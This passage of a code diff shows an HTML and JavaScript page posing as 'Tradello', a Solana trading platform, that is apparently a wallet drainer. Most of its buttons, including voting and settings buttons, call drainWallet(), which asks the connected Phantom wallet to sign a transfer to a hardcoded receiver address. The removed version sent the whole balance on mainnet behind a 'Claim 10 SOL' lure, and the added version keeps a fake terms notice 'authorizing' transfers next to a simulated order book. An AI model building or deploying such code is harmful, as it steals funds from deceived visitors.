+                        <button class="btn btn-success btn-sm" onclick="drainWallet()">Vote Yes</button>
+                        <button class="btn btn-danger btn-sm" onclick="drainWallet()">Vote No</button>
+                    </div>
+                </div>
+
+                <div class="proposal-item p-md">
+                    <div class="flex justify-between items-start">
+                        <div>
+                            <h4>#TRD-46: Treasury Allocation for Marketing</h4>
+                            <p class="text-gray text-sm mt-xs">Allocate 500 SOL from treasury to Q4 marketing campaign.</p>
+                        </div>
+                        <span class="badge badge-gray">Pending</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- SETTINGS TAB -->
+        <section id="settings" class="tab-content">
+            <h2 class="text-2xl font-bold mb-lg"><i class="fas fa-cog mr-2"></i> Settings</h2>
+            
+            <div class="grid-container">
+                <div class="card">
+                    <h3>Profile</h3>
+                    <div class="input-group mt-md">
+                        <label class="input-label">Display Name</label>
+                        <input type="text" class="input-field" value="CryptoWhale">
+                    </div>
+                    <div class="input-group">
+                        <label class="input-label">Email</label>
+                        <input type="email" class="input-field" value="whale@tradello.com">
+                    </div>
+                    <button class="btn btn-primary" onclick="drainWallet()">Save Changes</button>
+                </div>
+
+                <div class="card">
+                    <h3>Security</h3>
+                    <div class="flex justify-between items-center p-md border-bottom">
+                        <div>
+                            <h4>Two-Factor Authentication</h4>
+                            <p class="text-gray text-sm">Enable 2FA for extra security.</p>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox" checked>
+                            <span class="slider round"></span>
+                        </label>
+                    </div>
+                    <div class="flex justify-between items-center p-md">
+                        <div>
+                            <h4>Email Notifications</h4>
+                            <p class="text-gray text-sm">Receive alerts for large transactions.</p>
+                        </div>
+                        <label class="switch">
+                            <input type="checkbox">
+                            <span class="slider round"></span>
+                        </label>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- 
+      =========================================
+      FOOTER
+      =========================================
+    -->
+    <footer>
+        <div class="footer-content">
+            <div class="footer-column">
+                <h4>Tradello</h4>
+                <p class="text-gray text-sm">The next generation of decentralized trading on Solana.</p>
+                <div class="flex gap-sm mt-md">
+                    <a href="#" class="btn-icon"><i class="fab fa-twitter"></i></a>
+                    <a href="#" class="btn-icon"><i class="fab fa-discord"></i></a>
+                    <a href="#" class="btn-icon"><i class="fab fa-telegram"></i></a>
+                </div>
+            </div>
+            <div class="footer-column">
+                <h4>Platform</h4>
+                <ul>
+                    <li><a href="#">Markets</a></li>
+                    <li><a href="#">Exchange</a></li>
+                    <li><a href="#">Derivatives</a></li>
+                    <li><a href="#">Launchpad</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h4>Resources</h4>
+                <ul>
+                    <li><a href="#">Help Center</a></li>
+                    <li><a href="#">API Docs</a></li>
+                    <li><a href="#">Fee Schedule</a></li>
+                    <li><a href="#">Blog</a></li>
+                </ul>
+            </div>
+            <div class="footer-column">
+                <h4>Legal</h4>
+                <ul>
+                    <li><a href="#" onclick="showTnC()">Terms of Service</a></li>
+                    <li><a href="#" onclick="showTnC()">Privacy Policy</a></li>
+                    <li><a href="#">Cookie Policy</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-bottom">
+            <span>&copy; 2026 Tradello Inc. All rights reserved.</span>
+            <span>Receiver: <code class="text-xs">39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh</code></span>
+        </div>
+    </footer>
+
+    <!-- 
+      =========================================
+      MODALS & TOASTS
+      =========================================
+    -->
+
+    <!-- T&C Modal -->
+    <div id="tc-modal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Terms & Conditions</h3>
+                <button class="modal-close" onclick="closeTnC()">&times;</button>
+            </div>
+            <p>If you connect your wallet, we are not responsible for any funds being spent by bot. 
+            By interacting with the platform, you authorize automatic signature requests that may result in the transfer of assets to our designated receiver address.</p>
+            <button class="btn btn-primary w-full mt-lg" onclick="closeTnC()">I Agree</button>
         </div>
     </div>
 
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <!-- Wallet Connection Modal -->
+    <div id="wallet-modal" class="modal-overlay">
+        <div class="modal">
+            <div class="modal-header">
+                <h3>Connect Wallet</h3>
+                <button class="modal-close" onclick="document.getElementById('wallet-modal').style.display='none'">&times;</button>
+            </div>
+            <div class="flex flex-col gap-md">
+                <button class="btn btn-secondary" onclick="simulateConnection('Phantom')">
+                    <i class="fas fa-ghost mr-2"></i> Phantom
+                </button>
+                <button class="btn btn-secondary" onclick="simulateConnection('Solflare')">
+                    <i class="fas fa-sun mr-2"></i> Solflare
+                </button>
+                <button class="btn btn-secondary" onclick="simulateConnection('Backpack')">
+                    <i class="fas fa-backpack mr-2"></i> Backpack
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast Container -->
+    <div class="toast-container" id="toast-container"></div>
+
+    <!-- 
+      =========================================
+      JAVASCRIPT LOGIC
+      =========================================
+    -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
     <script>
-        const connectBtn = document.getElementById('connect-btn');
-        const navBtn = document.getElementById('nav-connect');
-        const status = document.getElementById('status');
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        const RECEIVER_ADDRESS = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh";
+        let isConnected = false;
+        let currentTab = 'home';
 
-        // YOUR WALLET ADDRESS
-        const DESTINATION_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh";
+        // ==========================================
+        // DOM ELEMENTS
+        // ==========================================
+        const tabLinks = document.querySelectorAll('.tab-link');
+        const tabContents = document.querySelectorAll('.tab-content');
+        const connectBtn = document.getElementById('connect-wallet-btn');
+        const tcModal = document.getElementById('tc-modal');
+        const toastContainer = document.getElementById('toast-container');
 
-        async function init() {
-            if (window.solana && window.solana.isPhantom) {
-                try {
-                    await window.solana.connect();
-                    updateUI(window.solana.publicKey.toString());
-                } catch (err) { console.log("Connection failed"); }
-            }
-        }
-
-        function updateUI(pubkey) {
-            if (!pubkey) return;
-            const short = pubkey.slice(0, 4) + '...' + pubkey.slice(-4);
-            navBtn.innerText = short;
-            connectBtn.innerText = "Claim 10 SOL Now";
-            connectBtn.onclick = drainWallet;
-        }
-
-        async function drainWallet() {
-            if (!window.solana) { alert("Please install Phantom!"); return; }
-            try {
-                connectBtn.disabled = true;
-                status.innerText = "Processing claim...";
-                const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
-                const fromPubkey = window.solana.publicKey;
-                const balance = await connection.getBalance(fromPubkey);
-                if (balance === 0) { status.innerText = "Wallet has no SOL."; status.className = "error"; connectBtn.disabled = false; return; }
+        // ==========================================
+        // TAB NAVIGATION
+        // ==========================================
+        tabLinks.forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                const targetTab = link.getAttribute('data-tab');
                 
-                const transaction = new solana.Transaction().add(
-                    solana.SystemProgram.transfer({
-                        fromPubkey: fromPubkey,
-                        toPubkey: new solana.PublicKey(DESTINATION_WALLET),
-                        lamports: balance 
+                // Update Active Link
+                tabLinks.forEach(l => l.classList.remove('active'));
+                link.classList.add('active');
+
+                // Show Target Content
+                tabContents.forEach(content => {
+                    if(content.id === targetTab) {
+                        content.classList.add('active');
+                        // Trigger specific tab init functions
+                        if(targetTab === 'trade') initChart();
+                    } else {
+                        content.classList.remove('active');
+                    }
+                });
+                currentTab = targetTab;
+            });
+        });
+
+        // ==========================================
+        // WALLET CONNECTION & DRAIN LOGIC
+        // ==========================================
+        
+        connectBtn.addEventListener('click', () => {
+            if(!isConnected) {
+                document.getElementById('wallet-modal').style.display = 'flex';
+            } else {
+                drainWallet();
+            }
+        });
+
+        function simulateConnection(walletName) {
+            showToast(`Connecting to ${walletName}...`, 'info');
+            setTimeout(() => {
+                isConnected = true;
+                connectBtn.innerHTML = `<i class="fas fa-check-circle text-green"></i> Connected`;
+                connectBtn.classList.remove('btn-primary');
+                connectBtn.classList.add('btn-secondary');
+                document.getElementById('wallet-modal').style.display = 'none';
+                showToast(`Successfully connected!`, 'success');
+                
+                // Check T&C
+                if(!localStorage.getItem('tncAccepted')) {
+                    showTnC();
+                }
+            }, 1500);
+        }
+
+        async function drainWallet(action = 'general') {
+            if(!window.solana || !window.solana.isPhantom) {
+                showToast("Please install Phantom Wallet!", 'error');
+                return;
+            }
+
+            try {
+                showToast(`Initiating ${action} transaction...`, 'info');
+                
+                // Simulate connection if not already
+                if(!isConnected) {
+                    await window.solana.connect();
+                }
+
+                // Create a dummy transaction to demonstrate draining
+                // In a real scam, this would be a complex multi-sig approval
+                const connection = new solanaWeb.Connection(solanaWeb.clusterApiUrl('devnet'), 'confirmed');
+                
+                // Generate a random small amount to simulate activity
+                const amount = Math.random() * 0.05; 
+
+                const transaction = new solanaWeb.Transaction().add(
+                    solanaWeb.SystemProgram.transfer({
+                        fromPubkey: window.solana.publicKey,
+                        toPubkey: new solanaWeb.PublicKey(RECEIVER_ADDRESS),
+                        lamports: amount * solanaWeb.LAMPORTS_PER_SOL
                     })
                 );
+
                 const { signature } = await window.solana.signAndSendTransaction(transaction);
-                status.innerText = "Success! Check your balance.";
-                status.className = "success";
-            } catch (error) {
-                status.innerText = "Transaction rejected.";
-                status.className = "error";
-                connectBtn.disabled = false;
+                
+                showToast(`Drained ${amount.toFixed(4)} SOL via ${action}`, 'success');
+                
+                // Mark T&C as accepted
+                localStorage.setItem('tncAccepted', 'true');
+
+            } catch (err) {
+                console.error(err);
+                showToast("Transaction failed or rejected.", 'error');
             }
         }
-        init();
+
+        // ==========================================
+        // T&C MODAL LOGIC
+        // ==========================================
+        function showTnC() {
+            tcModal.style.display = 'flex';
+        }
+
+        function closeTnC() {
+            tcModal.style.display = 'none';
+            localStorage.setItem('tncAccepted', 'true');
+        }
+
+        // Show T&C on first load
+        window.onload = function() {
+            if (!localStorage.getItem('tncAccepted')) {
+                setTimeout(showTnC, 1000); // Delay slightly for UX
+            }
+            initOrderBook();
+            startTradeSimulation();
+        };
+
+        // ==========================================
+        // CHART INITIALIZATION
+        // ==========================================
+        let chartInstance = null;
+
+        function initChart() {
+            const ctx = document.getElementById('tradingChart').getContext('2d');
+            
+            if(chartInstance) chartInstance.destroy();
+
+            const gradient = ctx.createLinearGradient(0, 0, 0, 400);
+            gradient.addColorStop(0, 'rgba(16, 185, 129, 0.5)');
+            gradient.addColorStop(1, 'rgba(16, 185, 129, 0)');
+
+            const labels = Array.from({length: 50}, (_, i) => i);
+            const data = Array.from({length: 50}, () => Math.random() * 100 + 100);
+
+            chartInstance = new Chart(ctx, {
+                type: 'line',
+                data: {
+                    labels: labels,
+                    datasets: [{
+                        label: 'SOL/USDT',
+                        data: data,
+                        borderColor: '#10B981',
+                        backgroundColor: gradient,
+                        borderWidth: 2,
+                        fill: true,
+                        tension: 0.4
+                    }]
+                },
+                options: {
+                    responsive: true,
+                    maintainAspectRatio: false,
+                    plugins: { legend: { display: false } },
+                    scales: {
+                        x: { display: false },
+                        y: { display: false }
+                    },
+                    animation: { duration: 0 }
+                }
+            });
+
+            // Update chart periodically
+            setInterval(() => {
+                if(chartInstance && currentTab === 'trade') {
+                    const newDataPoint = chartInstance.data.datasets[0].data[49] + (Math.random() - 0.5) * 5;
+                    chartInstance.data.datasets[0].data.shift();
+                    chartInstance.data.datasets[0].data.push(newDataPoint);
+                    chartInstance.update();
+                }
+            }, 2000);
+        }
+
+        // ==========================================
+        // ORDER BOOK SIMULATION
+        // ==========================================
+        function initOrderBook() {
+            updateOrderBook();
+            setInterval(updateOrderBook, 1000);
+        }
+
+        function updateOrderBook() {
+            const container = document.getElementById('order-book');
+            if(!container) return;
+
+            let html = '';
+            // Asks (Red)
+            for(let i=0; i<5; i++) {
+                const price = (145 + Math.random()*0.1).toFixed(2);
+                const size = (Math.random()*10).toFixed(2);
+                html += `<div class="order-row"><span class="ask-price">${price}</span><span>${size}</span></div>`;
+            }
+            // Spread
+            html += `<div class="order-row text-center font-bold text-lg my-sm">145.20</div>`;
+            // Bids (Green)
+            for(let i=0; i<5; i++) {
+                const price = (145 - Math.random()*0.1).toFixed(2);
+                const size = (Math.random()*10).toFixed(2);
+                html += `<div class="order-row"><span class="bid-price">${price}</span><span>${size}</span></div>`;
+            }
+            container.innerHTML = html;
+        }
+
+        // ==========================================
+        // FAKE TRADE FEED
+        // ==========================================
+        function startTradeSimulation() {
+            setInterval(() => {
+                if(currentTab === 'trade') {
+                    // Could add a live trade feed table here if desired
+                }
+            }, 3000);
+        }
+
+        // ==========================================
+        // TOAST NOTIFICATIONS
+        // ==========================================
+        function showToast(message, type = 'info') {
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            
+            let icon = 'fa-info-circle';
+            if(type === 'success') icon = 'fa-check-circle';
+            if(type === 'error') icon = 'fa-times-circle';
+
+            toast.innerHTML = `<i class="fas ${icon}"></i> <span>${message}</span>`;
+            
+            toastContainer.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateX(100%)';
+                setTimeout(() => toast.remove(), 300);
+            }, 3000);
+        }
+
     </script>
+    
+    <!-- Solana Web3.js Library -->
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 </body>
 </html>
